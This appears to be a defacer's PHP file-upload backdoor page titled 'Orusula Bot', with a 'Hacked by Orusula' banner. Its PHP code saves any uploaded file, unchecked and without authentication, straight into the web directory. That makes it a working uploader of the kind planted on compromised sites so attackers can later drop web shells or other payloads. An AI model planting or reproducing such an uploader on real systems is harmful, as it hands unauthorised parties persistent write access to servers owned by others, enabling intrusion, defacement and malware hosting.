<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet"> 
    <title>Orusula Bot</title>
</head>
<style>
* {
    font-family: 'Montserrat', sans-serif;
    text-align: center;
    color: white;
    text-shadow: 2px 2px 10px black;
}
body {
    background: url('https://wallpapercave.com/wp/wp2581456.jpg') no-repeat center center fixed;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    opacity: 0.9;
    background-size: cover;
}
</style>
<body>
<!-- hacked by orusula :") -->
<!-- Hacked By Orusula :") -->
    <form enctype="multipart/form-data" action="" method="POST">
        <h1>
            # Hacked by Orusula
        </h1>
        <p>Upload your file</p>
        <input type="file" name="uploaded_file"/>
        <input type="hidden" name="token"> <!-- comming soon -->
        <input type="submit" value="Upload"/>
    </form>
</body>
</html>

<?php
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)){
      echo "The file ". basename( $_FILES['uploaded_file']['name']). " has been uploaded";
    }
    else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>